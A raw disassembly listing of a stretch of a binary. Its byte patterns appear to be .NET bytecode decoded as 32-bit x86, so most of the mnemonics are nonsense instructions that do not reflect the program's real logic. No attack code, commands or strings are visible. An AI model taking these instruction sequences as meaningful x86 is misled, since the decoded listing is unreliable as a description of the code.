  404149:	00 04 8c             	add    %al,(%esp,%ecx,4)
  40414c:	3d 00 00 01 28       	cmp    $0x28010000,%eax
  404151:	20 00                	and    %al,(%eax)
  404153:	00 0a                	add    %cl,(%edx)
  404155:	00 7e 08             	add    %bh,0x8(%esi)
  404158:	00 00                	add    %al,(%eax)
  40415a:	04 16                	add    $0x16,%al
  40415c:	fe 01                	incb   (%ecx)
  40415e:	13 0b                	adc    (%ebx),%ecx
  404160:	11 0b                	adc    %ecx,(%ebx)
  404162:	2c 16                	sub    $0x16,%al
  404164:	00 11                	add    %dl,(%ecx)
  404166:	04 08                	add    $0x8,%al
  404168:	28 16                	sub    %dl,(%esi)
  40416a:	00 00                	add    %al,(%eax)
  40416c:	06                   	push   %es
  40416d:	16                   	push   %ss
  40416e:	fe 01                	incb   (%ecx)
  404170:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404173:	0c 2c                	or     $0x2c,%al
  404175:	03 00                	add    (%eax),%eax
  404177:	2b 3b                	sub    (%ebx),%edi
  404179:	00 11                	add    %dl,(%ecx)
  40417b:	04 7e                	add    $0x7e,%al
  40417d:	15 00 00 04 28       	adc    $0x28040000,%eax
  404182:	18 00                	sbb    %al,(%eax)
  404184:	00 06                	add    %al,(%esi)
  404186:	16                   	push   %ss
  404187:	fe 01                	incb   (%ecx)
  404189:	13 0d 11 0d 2c 03    	adc    0x32c0d11,%ecx
  40418f:	00 2b                	add    %ch,(%ebx)
  404191:	22 11                	and    (%ecx),%dl
  404193:	04 06                	add    $0x6,%al
  404195:	09 28                	or     %ebp,(%eax)
  404197:	2a 00                	sub    (%eax),%al
  404199:	00 06                	add    %al,(%esi)
  40419b:	16                   	push   %ss
  40419c:	fe 01                	incb   (%ecx)
  40419e:	13 0e                	adc    (%esi),%ecx
  4041a0:	11 0e                	adc    %ecx,(%esi)
  4041a2:	2c 03                	sub    $0x3,%al
  4041a4:	00 2b                	add    %ch,(%ebx)
  4041a6:	0d 72 f4 50 00       	or     $0x50f472,%eax
  4041ab:	70 28                	jo     0x4041d5
  4041ad:	1e                   	push   %ds
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 00                	or     (%eax),%al
  4041b2:	2b 00                	sub    (%eax),%eax
  4041b4:	2a 22                	sub    (%edx),%ah
  4041b6:	02 28                	add    (%eax),%ch
  4041b8:	25 00 00 0a 00       	and    $0xa0000,%eax
  4041bd:	2a 1a                	sub    (%edx),%bl
  4041bf:	72 26                	jb     0x4041e7
  4041c1:	51                   	push   %ecx
  4041c2:	00 70 2a             	add    %dh,0x2a(%eax)
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 13                	add    %dl,(%ebx)
  4041c9:	30 02                	xor    %al,(%edx)
  4041cb:	00 9e 00 00 00 1c    	add    %bl,0x1c000000(%esi)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	11 00                	adc    %eax,(%eax)
  4041d5:	72 32                	jb     0x404209
  4041d7:	51                   	push   %ecx
  4041d8:	00 70 28             	add    %dh,0x28(%eax)
  4041db:	1e                   	push   %ds
  4041dc:	00 00                	add    %al,(%eax)
  4041de:	0a 00                	or     (%eax),%al
  4041e0:	72 fe                	jb     0x4041e0
  4041e2:	4f                   	dec    %edi
  4041e3:	00 70 0a             	add    %dh,0xa(%eax)
  4041e6:	72 fe                	jb     0x4041e6
  4041e8:	4f                   	dec    %edi
  4041e9:	00 70 0b             	add    %dh,0xb(%eax)
  4041ec:	03 72 74             	add    0x74(%edx),%esi
  4041ef:	50                   	push   %eax
  4041f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4041f3:	4b                   	dec    %ebx
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 0d 09 2c 0e 00    	or     0xe2c09,%cl
  4041fc:	03 72 74             	add    0x74(%edx),%esi
  4041ff:	50                   	push   %eax
  404200:	00 70 6f             	add    %dh,0x6f(%eax)
  404203:	4c                   	dec    %esp
  404204:	00 00                	add    %al,(%eax)
  404206:	0a 0a                	or     (%edx),%cl
  404208:	00 03                	add    %al,(%ebx)
  40420a:	72 88                	jb     0x404194
  40420c:	50                   	push   %eax
  40420d:	00 70 6f             	add    %dh,0x6f(%eax)
  404210:	4b                   	dec    %ebx
  404211:	00 00                	add    %al,(%eax)
  404213:	0a 13                	or     (%ebx),%dl
  404215:	04 11                	add    $0x11,%al
  404217:	04 2c                	add    $0x2c,%al
  404219:	0e                   	push   %cs
  40421a:	00 03                	add    %al,(%ebx)
  40421c:	72 88                	jb     0x4041a6
  40421e:	50                   	push   %eax
  40421f:	00 70 6f             	add    %dh,0x6f(%eax)
  404222:	4c                   	dec    %esp
  404223:	00 00                	add    %al,(%eax)
  404225:	0a 0b                	or     (%ebx),%cl
  404227:	00 28                	add    %ch,(%eax)
  404229:	20 00                	and    %al,(%eax)
  40422b:	00 06                	add    %al,(%esi)
  40422d:	00 73 4d             	add    %dh,0x4d(%ebx)
  404230:	00 00                	add    %al,(%eax)
  404232:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404235:	28 08                	sub    %cl,(%eax)
  404237:	00 00                	add    %al,(%eax)
  404239:	06                   	push   %es
  40423a:	6f                   	outsl  %ds:(%esi),(%dx)
  40423b:	4e                   	dec    %esi
  40423c:	00 00                	add    %al,(%eax)
  40423e:	0a 00                	or     (%eax),%al
  404240:	08 07                	or     %al,(%edi)
  404242:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404245:	00 06                	add    %al,(%esi)
  404247:	16                   	push   %ss
  404248:	fe 01                	incb   (%ecx)
  40424a:	13 05 11 05 2c 03    	adc    0x32c0511,%eax
  404250:	00 2b                	add    %ch,(%ebx)
  404252:	1e                   	push   %ds
  404253:	08 06                	or     %al,(%esi)
  404255:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404258:	00 06                	add    %al,(%esi)
  40425a:	16                   	push   %ss
  40425b:	fe 01                	incb   (%ecx)
  40425d:	13 06                	adc    (%esi),%eax
  40425f:	11 06                	adc    %eax,(%esi)
  404261:	2c 03                	sub    $0x3,%al
  404263:	00 2b                	add    %ch,(%ebx)
  404265:	0b 72 64             	or     0x64(%edx),%esi
  404268:	51                   	push   %ecx
  404269:	00 70 28             	add    %dh,0x28(%eax)
  40426c:	1e                   	push   %ds
  40426d:	00 00                	add    %al,(%eax)
  40426f:	0a 00                	or     (%eax),%al
  404271:	2a 22                	sub    (%edx),%ah
  404273:	02 28                	add    (%eax),%ch
  404275:	25 00 00 0a 00       	and    $0xa0000,%eax
  40427a:	2a 1a                	sub    (%edx),%bl
  40427c:	72 92                	jb     0x404210
  40427e:	51                   	push   %ecx
  40427f:	00 70 2a             	add    %dh,0x2a(%eax)
  404282:	00 00                	add    %al,(%eax)
  404284:	13 30                	adc    (%eax),%esi
  404286:	04 00                	add    $0x0,%al
  404288:	18 03                	sbb    %al,(%ebx)
  40428a:	00 00                	add    %al,(%eax)
  40428c:	1d 00 00 11 00       	sbb    $0x110000,%eax
  404291:	72 a0                	jb     0x404233
  404293:	51                   	push   %ecx
  404294:	00 70 28             	add    %dh,0x28(%eax)
  404297:	1e                   	push   %ds
  404298:	00 00                	add    %al,(%eax)
  40429a:	0a 00                	or     (%eax),%al
  40429c:	03 72 d4             	add    -0x2c(%edx),%esi
  40429f:	51                   	push   %ecx
  4042a0:	00 70 6f             	add    %dh,0x6f(%eax)
  4042a3:	4b                   	dec    %ebx
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4042a9:	2c 12                	sub    $0x12,%al
  4042ab:	00 03                	add    %al,(%ebx)
  4042ad:	72 d4                	jb     0x404283
  4042af:	51                   	push   %ecx
  4042b0:	00 70 6f             	add    %dh,0x6f(%eax)
  4042b3:	4c                   	dec    %esp
  4042b4:	00 00                	add    %al,(%eax)
  4042b6:	0a 80 17 00 00 04    	or     0x4000017(%eax),%al
  4042bc:	00 03                	add    %al,(%ebx)
  4042be:	72 e6                	jb     0x4042a6
  4042c0:	51                   	push   %ecx
  4042c1:	00 70 6f             	add    %dh,0x6f(%eax)
  4042c4:	4b                   	dec    %ebx
  4042c5:	00 00                	add    %al,(%eax)
  4042c7:	0a 0d 09 2c 12 00    	or     0x122c09,%cl
  4042cd:	03 72 e6             	add    -0x1a(%edx),%esi
  4042d0:	51                   	push   %ecx
  4042d1:	00 70 6f             	add    %dh,0x6f(%eax)
  4042d4:	4c                   	dec    %esp
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  4042dd:	00 03                	add    %al,(%ebx)
  4042df:	72 f2                	jb     0x4042d3
  4042e1:	51                   	push   %ecx
  4042e2:	00 70 6f             	add    %dh,0x6f(%eax)
  4042e5:	4b                   	dec    %ebx
  4042e6:	00 00                	add    %al,(%eax)
  4042e8:	0a 13                	or     (%ebx),%dl
  4042ea:	04 11                	add    $0x11,%al
  4042ec:	04 2c                	add    $0x2c,%al
  4042ee:	12 00                	adc    (%eax),%al
  4042f0:	03 72 f2             	add    -0xe(%edx),%esi
  4042f3:	51                   	push   %ecx
  4042f4:	00 70 6f             	add    %dh,0x6f(%eax)
  4042f7:	4c                   	dec    %esp
  4042f8:	00 00                	add    %al,(%eax)
  4042fa:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  404300:	00 03                	add    %al,(%ebx)
  404302:	72 00                	jb     0x404304
  404304:	52                   	push   %edx
  404305:	00 70 6f             	add    %dh,0x6f(%eax)
  404308:	4b                   	dec    %ebx
  404309:	00 00                	add    %al,(%eax)
  40430b:	0a 13                	or     (%ebx),%dl
  40430d:	05 11 05 2c 12       	add    $0x122c0511,%eax
  404312:	00 03                	add    %al,(%ebx)
  404314:	72 00                	jb     0x404316
  404316:	52                   	push   %edx
  404317:	00 70 6f             	add    %dh,0x6f(%eax)
  40431a:	4c                   	dec    %esp
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  404323:	00 03                	add    %al,(%ebx)
  404325:	72 0c                	jb     0x404333
  404327:	52                   	push   %edx
  404328:	00 70 6f             	add    %dh,0x6f(%eax)
  40432b:	4b                   	dec    %ebx
  40432c:	00 00                	add    %al,(%eax)
  40432e:	0a 13                	or     (%ebx),%dl
  404330:	06                   	push   %es
  404331:	11 06                	adc    %eax,(%esi)
  404333:	2c 12                	sub    $0x12,%al
  404335:	00 03                	add    %al,(%ebx)
  404337:	72 0c                	jb     0x404345
  404339:	52                   	push   %edx
  40433a:	00 70 6f             	add    %dh,0x6f(%eax)
  40433d:	4c                   	dec    %esp
  40433e:	00 00                	add    %al,(%eax)
  404340:	0a 80 1b 00 00 04    	or     0x400001b(%eax),%al
  404346:	00 03                	add    %al,(%ebx)
  404348:	72 1c                	jb     0x404366
  40434a:	52                   	push   %edx
  40434b:	00 70 6f             	add    %dh,0x6f(%eax)
  40434e:	4b                   	dec    %ebx
  40434f:	00 00                	add    %al,(%eax)
  404351:	0a 13                	or     (%ebx),%dl
  404353:	07                   	pop    %es
  404354:	11 07                	adc    %eax,(%edi)
  404356:	2c 12                	sub    $0x12,%al
  404358:	00 03                	add    %al,(%ebx)
  40435a:	72 1c                	jb     0x404378
  40435c:	52                   	push   %edx
  40435d:	00 70 6f             	add    %dh,0x6f(%eax)
  404360:	4c                   	dec    %esp
  404361:	00 00                	add    %al,(%eax)
  404363:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  404369:	00 03                	add    %al,(%ebx)
  40436b:	72 28                	jb     0x404395
  40436d:	52                   	push   %edx
  40436e:	00 70 6f             	add    %dh,0x6f(%eax)
  404371:	4b                   	dec    %ebx
  404372:	00 00                	add    %al,(%eax)
  404374:	0a 13                	or     (%ebx),%dl
  404376:	08 11                	or     %dl,(%ecx)
  404378:	08 2c 12             	or     %ch,(%edx,%edx,1)
  40437b:	00 03                	add    %al,(%ebx)
  40437d:	72 28                	jb     0x4043a7
  40437f:	52                   	push   %edx
  404380:	00 70 6f             	add    %dh,0x6f(%eax)
  404383:	4c                   	dec    %esp
  404384:	00 00                	add    %al,(%eax)
  404386:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  40438c:	00 03                	add    %al,(%ebx)
  40438e:	72 30                	jb     0x4043c0
  404390:	52                   	push   %edx
  404391:	00 70 6f             	add    %dh,0x6f(%eax)
  404394:	4b                   	dec    %ebx
  404395:	00 00                	add    %al,(%eax)
  404397:	0a 13                	or     (%ebx),%dl
  404399:	09 11                	or     %edx,(%ecx)
  40439b:	09 2c 12             	or     %ebp,(%edx,%edx,1)
  40439e:	00 03                	add    %al,(%ebx)
  4043a0:	72 30                	jb     0x4043d2
  4043a2:	52                   	push   %edx
  4043a3:	00 70 6f             	add    %dh,0x6f(%eax)
  4043a6:	4c                   	dec    %esp
  4043a7:	00 00                	add    %al,(%eax)
  4043a9:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  4043af:	00 03                	add    %al,(%ebx)
  4043b1:	72 4a                	jb     0x4043fd
  4043b3:	52                   	push   %edx
  4043b4:	00 70 6f             	add    %dh,0x6f(%eax)
  4043b7:	4b                   	dec    %ebx
  4043b8:	00 00                	add    %al,(%eax)
  4043ba:	0a 13                	or     (%ebx),%dl
  4043bc:	0a 11                	or     (%ecx),%dl
  4043be:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4043c1:	00 03                	add    %al,(%ebx)
  4043c3:	72 4a                	jb     0x40440f
  4043c5:	52                   	push   %edx
  4043c6:	00 70 6f             	add    %dh,0x6f(%eax)
  4043c9:	4c                   	dec    %esp
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  4043d2:	00 28                	add    %ch,(%eax)
  4043d4:	20 00                	and    %al,(%eax)
  4043d6:	00 06                	add    %al,(%esi)
  4043d8:	00 73 4d             	add    %dh,0x4d(%ebx)
  4043db:	00 00                	add    %al,(%eax)
  4043dd:	0a 0a                	or     (%edx),%cl
  4043df:	06                   	push   %es
  4043e0:	28 08                	sub    %cl,(%eax)
  4043e2:	00 00                	add    %al,(%eax)
  4043e4:	06                   	push   %es
  4043e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e6:	4e                   	dec    %esi
  4043e7:	00 00                	add    %al,(%eax)
  4043e9:	0a 00                	or     (%eax),%al
  4043eb:	28 1b                	sub    %bl,(%ebx)
  4043ed:	00 00                	add    %al,(%eax)
  4043ef:	06                   	push   %es
  4043f0:	00 28                	add    %ch,(%eax)
  4043f2:	1c 00                	sbb    $0x0,%al
  4043f4:	00 06                	add    %al,(%esi)
  4043f6:	00 7e 17             	add    %bh,0x17(%esi)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	04 7e                	add    $0x7e,%al
  4043fd:	18 00                	sbb    %al,(%eax)
  4043ff:	00 04 7e             	add    %al,(%esi,%edi,2)
  404402:	10 00                	adc    %al,(%eax)
  404404:	00 04 17             	add    %al,(%edi,%edx,1)
  404407:	73 10                	jae    0x404419
  404409:	00 00                	add    %al,(%eax)
  40440b:	06                   	push   %es
  40440c:	0b 72 54             	or     0x54(%edx),%esi
  40440f:	52                   	push   %edx
  404410:	00 70 28             	add    %dh,0x28(%eax)
  404413:	1e                   	push   %ds
  404414:	00 00                	add    %al,(%eax)
  404416:	0a 00                	or     (%eax),%al
  404418:	72 a6                	jb     0x4043c0
  40441a:	52                   	push   %edx
  40441b:	00 70 7e             	add    %dh,0x7e(%eax)
  40441e:	01 00                	add    %eax,(%eax)
  404420:	00 04 28             	add    %al,(%eax,%ebp,1)
  404423:	20 00                	and    %al,(%eax)
  404425:	00 0a                	add    %cl,(%edx)
  404427:	00 72 c8             	add    %dh,-0x38(%edx)
  40442a:	52                   	push   %edx
  40442b:	00 70 7e             	add    %dh,0x7e(%eax)
  40442e:	03 00                	add    (%eax),%eax
  404430:	00 04 28             	add    %al,(%eax,%ebp,1)
  404433:	20 00                	and    %al,(%eax)
  404435:	00 0a                	add    %cl,(%edx)
  404437:	00 72 f4             	add    %dh,-0xc(%edx)
  40443a:	52                   	push   %edx
  40443b:	00 70 7e             	add    %dh,0x7e(%eax)
  40443e:	18 00                	sbb    %al,(%eax)
  404440:	00 04 28             	add    %al,(%eax,%ebp,1)
  404443:	20 00                	and    %al,(%eax)
  404445:	00 0a                	add    %cl,(%edx)
  404447:	00 72 1a             	add    %dh,0x1a(%edx)
  40444a:	53                   	push   %ebx
  40444b:	00 70 7e             	add    %dh,0x7e(%eax)
  40444e:	04 00                	add    $0x0,%al
  404450:	00 04 28             	add    %al,(%eax,%ebp,1)
  404453:	20 00                	and    %al,(%eax)
  404455:	00 0a                	add    %cl,(%edx)
  404457:	00 06                	add    %al,(%esi)
  404459:	28 0a                	sub    %cl,(%edx)
  40445b:	00 00                	add    %al,(%eax)
  40445d:	06                   	push   %es
  40445e:	16                   	push   %ss
  40445f:	fe 01                	incb   (%ecx)
  404461:	13 0b                	adc    (%ebx),%ecx
  404463:	11 0b                	adc    %ecx,(%ebx)
  404465:	2c 06                	sub    $0x6,%al
  404467:	00 38                	add    %bh,(%eax)
  404469:	3a 01                	cmp    (%ecx),%al
  40446b:	00 00                	add    %al,(%eax)
  40446d:	06                   	push   %es
  40446e:	28 01                	sub    %al,(%ecx)
  404470:	00 00                	add    %al,(%eax)
  404472:	06                   	push   %es
  404473:	16                   	push   %ss
  404474:	fe 01                	incb   (%ecx)
  404476:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404479:	0c 2c                	or     $0x2c,%al
  40447b:	06                   	push   %es
  40447c:	00 38                	add    %bh,(%eax)
  40447e:	25 01 00 00 06       	and    $0x6000001,%eax
  404483:	28 02                	sub    %al,(%edx)
  404485:	00 00                	add    %al,(%eax)
  404487:	06                   	push   %es
  404488:	16                   	push   %ss
  404489:	fe 01                	incb   (%ecx)
  40448b:	13 0d 11 0d 2c 06    	adc    0x62c0d11,%ecx
  404491:	00 38                	add    %bh,(%eax)
  404493:	10 01                	adc    %al,(%ecx)
  404495:	00 00                	add    %al,(%eax)
  404497:	06                   	push   %es
  404498:	28 04 00             	sub    %al,(%eax,%eax,1)
  40449b:	00 06                	add    %al,(%esi)
  40449d:	16                   	push   %ss
  40449e:	fe 01                	incb   (%ecx)
  4044a0:	13 0e                	adc    (%esi),%ecx
  4044a2:	11 0e                	adc    %ecx,(%esi)
  4044a4:	2c 06                	sub    $0x6,%al
  4044a6:	00 38                	add    %bh,(%eax)
  4044a8:	fb                   	sti
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 06                	add    %al,(%esi)
  4044ad:	28 05 00 00 06 16    	sub    %al,0x16060000
  4044b3:	fe 01                	incb   (%ecx)
  4044b5:	13 0f                	adc    (%edi),%ecx
  4044b7:	11 0f                	adc    %ecx,(%edi)
  4044b9:	2c 06                	sub    $0x6,%al
  4044bb:	00 38                	add    %bh,(%eax)
  4044bd:	e6 00                	out    %al,$0x0
  4044bf:	00 00                	add    %al,(%eax)
  4044c1:	06                   	push   %es
  4044c2:	28 06                	sub    %al,(%esi)
  4044c4:	00 00                	add    %al,(%eax)
  4044c6:	06                   	push   %es
  4044c7:	16                   	push   %ss
  4044c8:	fe 01                	incb   (%ecx)
  4044ca:	13 10                	adc    (%eax),%edx
  4044cc:	11 10                	adc    %edx,(%eax)
  4044ce:	2c 06                	sub    $0x6,%al
  4044d0:	00 38                	add    %bh,(%eax)
  4044d2:	d1 00                	roll   $1,(%eax)
  4044d4:	00 00                	add    %al,(%eax)
  4044d6:	06                   	push   %es
  4044d7:	28 03                	sub    %al,(%ebx)
  4044d9:	00 00                	add    %al,(%eax)
  4044db:	06                   	push   %es
  4044dc:	16                   	push   %ss
  4044dd:	fe 01                	incb   (%ecx)
  4044df:	13 11                	adc    (%ecx),%edx
  4044e1:	11 11                	adc    %edx,(%ecx)
  4044e3:	2c 06                	sub    $0x6,%al
  4044e5:	00 38                	add    %bh,(%eax)
  4044e7:	bc 00 00 00 06       	mov    $0x6000000,%esp
  4044ec:	28 05 00 00 06 16    	sub    %al,0x16060000
  4044f2:	fe 01                	incb   (%ecx)
  4044f4:	13 12                	adc    (%edx),%edx
  4044f6:	11 12                	adc    %edx,(%edx)
  4044f8:	2c 06                	sub    $0x6,%al
  4044fa:	00 38                	add    %bh,(%eax)
  4044fc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4044fd:	00 00                	add    %al,(%eax)
  4044ff:	00 72 5e             	add    %dh,0x5e(%edx)
  404502:	53                   	push   %ebx
  404503:	00 70 28             	add    %dh,0x28(%eax)
  404506:	1e                   	push   %ds
  404507:	00 00                	add    %al,(%eax)
  404509:	0a 00                	or     (%eax),%al
  40450b:	72 ed                	jb     0x4044fa
  40450d:	53                   	push   %ebx
  40450e:	00 70 7e             	add    %dh,0x7e(%eax)
  404511:	0a 00                	or     (%eax),%al
  404513:	00 04 13             	add    %al,(%ebx,%edx,1)
  404516:	13 12                	adc    (%edx),%edx
  404518:	13 fe                	adc    %esi,%edi
  40451a:	16                   	push   %ss
  40451b:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  404520:	14 00                	adc    $0x0,%al
  404522:	00 0a                	add    %cl,(%edx)
  404524:	72 37                	jb     0x40455d
  404526:	54                   	push   %esp
  404527:	00 70 28             	add    %dh,0x28(%eax)
  40452a:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  40452f:	1e                   	push   %ds
  404530:	00 00                	add    %al,(%eax)
  404532:	0a 00                	or     (%eax),%al
  404534:	72 9d                	jb     0x4044d3
  404536:	54                   	push   %esp
  404537:	00 70 28             	add    %dh,0x28(%eax)
  40453a:	1e                   	push   %ds
  40453b:	00 00                	add    %al,(%eax)
  40453d:	0a 00                	or     (%eax),%al
  40453f:	72 1b                	jb     0x40455c
  404541:	55                   	push   %ebp
  404542:	00 70 7e             	add    %dh,0x7e(%eax)
  404545:	0a 00                	or     (%eax),%al
  404547:	00 04 13             	add    %al,(%ebx,%edx,1)
  40454a:	13 12                	adc    (%edx),%edx
  40454c:	13 fe                	adc    %esi,%edi
  40454e:	16                   	push   %ss
  40454f:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  404554:	14 00                	adc    $0x0,%al
  404556:	00 0a                	add    %cl,(%edx)
  404558:	72 61                	jb     0x4045bb
  40455a:	55                   	push   %ebp
  40455b:	00 70 28             	add    %dh,0x28(%eax)
  40455e:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  404563:	1e                   	push   %ds
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 00                	or     (%eax),%al
  404568:	72 97                	jb     0x404501
  40456a:	55                   	push   %ebp
  40456b:	00 70 28             	add    %dh,0x28(%eax)
  40456e:	1e                   	push   %ds
  40456f:	00 00                	add    %al,(%eax)
  404571:	0a 00                	or     (%eax),%al
  404573:	72 03                	jb     0x404578
  404575:	56                   	push   %esi
  404576:	00 70 7e             	add    %dh,0x7e(%eax)
  404579:	0a 00                	or     (%eax),%al
  40457b:	00 04 13             	add    %al,(%ebx,%edx,1)
  40457e:	13 12                	adc    (%edx),%edx
  404580:	13 fe                	adc    %esi,%edi
  404582:	16                   	push   %ss
  404583:	15 00 00 01 6f       	adc    $0x6f010000,%eax
  404588:	14 00                	adc    $0x0,%al
  40458a:	00 0a                	add    %cl,(%edx)
  40458c:	72 37                	jb     0x4045c5
  40458e:	54                   	push   %esp
  40458f:	00 70 28             	add    %dh,0x28(%eax)
  404592:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  404597:	1e                   	push   %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	0a 00                	or     (%eax),%al
  40459c:	72 4b                	jb     0x4045e9
  40459e:	56                   	push   %esi
  40459f:	00 70 28             	add    %dh,0x28(%eax)
  4045a2:	1e                   	push   %ds
  4045a3:	00 00                	add    %al,(%eax)
  4045a5:	0a 00                	or     (%eax),%al
  4045a7:	2a 22                	sub    (%edx),%ah
  4045a9:	02 28                	add    (%eax),%ch
  4045ab:	25 00 00 0a 00       	and    $0xa0000,%eax
  4045b0:	2a 00                	sub    (%eax),%al
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	13 30                	adc    (%eax),%esi
  4045b6:	01 00                	add    %eax,(%eax)
  4045b8:	5b                   	pop    %ebx
  4045b9:	00 00                	add    %al,(%eax)
  4045bb:	00 00                	add    %al,(%eax)
  4045bd:	00 00                	add    %al,(%eax)
  4045bf:	00 72 fe             	add    %dh,-0x2(%edx)
  4045c2:	4f                   	dec    %edi
  4045c3:	00 70 80             	add    %dh,-0x80(%eax)
  4045c6:	17                   	pop    %ss
  4045c7:	00 00                	add    %al,(%eax)
  4045c9:	04 72                	add    $0x72,%al
  4045cb:	fe 4f 00             	decb   0x0(%edi)
  4045ce:	70 80                	jo     0x404550
  4045d0:	18 00                	sbb    %al,(%eax)
  4045d2:	00 04 72             	add    %al,(%edx,%esi,2)
  4045d5:	7b 56                	jnp    0x40462d
  4045d7:	00 70 80             	add    %dh,-0x80(%eax)
  4045da:	19 00                	sbb    %eax,(%eax)
  4045dc:	00 04 72             	add    %al,(%edx,%esi,2)
  4045df:	9d                   	popf
  4045e0:	56                   	push   %esi
  4045e1:	00 70 80             	add    %dh,-0x80(%eax)
  4045e4:	1a 00                	sbb    (%eax),%al
  4045e6:	00 04 72             	add    %al,(%edx,%esi,2)
  4045e9:	b3 56                	mov    $0x56,%bl
  4045eb:	00 70 80             	add    %dh,-0x80(%eax)
  4045ee:	1b 00                	sbb    (%eax),%eax
  4045f0:	00 04 72             	add    %al,(%edx,%esi,2)
  4045f3:	fe 4f 00             	decb   0x0(%edi)
  4045f6:	70 80                	jo     0x404578
  4045f8:	1c 00                	sbb    $0x0,%al
  4045fa:	00 04 72             	add    %al,(%edx,%esi,2)
  4045fd:	c7                   	(bad)
  4045fe:	56                   	push   %esi
  4045ff:	00 70 80             	add    %dh,-0x80(%eax)
  404602:	1d 00 00 04 72       	sbb    $0x72040000,%eax
  404607:	d7                   	xlat   %ds:(%ebx)
  404608:	56                   	push   %esi
  404609:	00 70 80             	add    %dh,-0x80(%eax)
  40460c:	1e                   	push   %ds
  40460d:	00 00                	add    %al,(%eax)
  40460f:	04 72                	add    $0x72,%al
  404611:	3b 57 00             	cmp    0x0(%edi),%edx
  404614:	70 80                	jo     0x404596
  404616:	1f                   	pop    %ds
  404617:	00 00                	add    %al,(%eax)
  404619:	04 2a                	add    $0x2a,%al
  40461b:	1a 72 6f             	sbb    0x6f(%edx),%dh
  40461e:	57                   	push   %edi
  40461f:	00 70 2a             	add    %dh,0x2a(%eax)
  404622:	00 00                	add    %al,(%eax)
  404624:	13 30                	adc    (%eax),%esi
  404626:	02 00                	add    (%eax),%al
  404628:	3e 01 00             	add    %eax,%ds:(%eax)
  40462b:	00 1e                	add    %bl,(%esi)
  40462d:	00 00                	add    %al,(%eax)
  40462f:	11 00                	adc    %eax,(%eax)
  404631:	72 7d                	jb     0x4046b0
  404633:	57                   	push   %edi
  404634:	00 70 28             	add    %dh,0x28(%eax)
  404637:	1e                   	push   %ds
  404638:	00 00                	add    %al,(%eax)
  40463a:	0a 00                	or     (%eax),%al
  40463c:	72 fe                	jb     0x40463c
  40463e:	4f                   	dec    %edi
  40463f:	00 70 0a             	add    %dh,0xa(%eax)
  404642:	72 fe                	jb     0x404642
  404644:	4f                   	dec    %edi
  404645:	00 70 0b             	add    %dh,0xb(%eax)
  404648:	72 46                	jb     0x404690
  40464a:	50                   	push   %eax
  40464b:	00 70 0c             	add    %dh,0xc(%eax)
  40464e:	16                   	push   %ss
  40464f:	0d 03 72 74 50       	or     $0x50747203,%eax
  404654:	00 70 6f             	add    %dh,0x6f(%eax)
  404657:	4b                   	dec    %ebx
  404658:	00 00                	add    %al,(%eax)
  40465a:	0a 13                	or     (%ebx),%dl
  40465c:	05 11 05 2c 0e       	add    $0xe2c0511,%eax
  404661:	00 03                	add    %al,(%ebx)
  404663:	72 74                	jb     0x4046d9
  404665:	50                   	push   %eax
  404666:	00 70 6f             	add    %dh,0x6f(%eax)
  404669:	4c                   	dec    %esp
  40466a:	00 00                	add    %al,(%eax)
  40466c:	0a 0a                	or     (%edx),%cl
  40466e:	00 03                	add    %al,(%ebx)
  404670:	72 88                	jb     0x4045fa
  404672:	50                   	push   %eax
  404673:	00 70 6f             	add    %dh,0x6f(%eax)
  404676:	4b                   	dec    %ebx
  404677:	00 00                	add    %al,(%eax)
  404679:	0a 13                	or     (%ebx),%dl
  40467b:	06                   	push   %es
  40467c:	11 06                	adc    %eax,(%esi)
  40467e:	2c 0e                	sub    $0xe,%al
  404680:	00 03                	add    %al,(%ebx)
  404682:	72 88                	jb     0x40460c
  404684:	50                   	push   %eax
  404685:	00 70 6f             	add    %dh,0x6f(%eax)
  404688:	4c                   	dec    %esp
  404689:	00 00                	add    %al,(%eax)
  40468b:	0a 0b                	or     (%ebx),%cl
  40468d:	00 03                	add    %al,(%ebx)
  40468f:	72 a4                	jb     0x404635
  404691:	50                   	push   %eax
  404692:	00 70 6f             	add    %dh,0x6f(%eax)
  404695:	4b                   	dec    %ebx
  404696:	00 00                	add    %al,(%eax)
  404698:	0a 13                	or     (%ebx),%dl
  40469a:	07                   	pop    %es
  40469b:	11 07                	adc    %eax,(%edi)
  40469d:	2c 0e                	sub    $0xe,%al
  40469f:	00 03                	add    %al,(%ebx)
  4046a1:	72 a4                	jb     0x404647
  4046a3:	50                   	push   %eax
  4046a4:	00 70 6f             	add    %dh,0x6f(%eax)
  4046a7:	4c                   	dec    %esp
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4046ad:	03 72 b1             	add    -0x4f(%edx),%esi
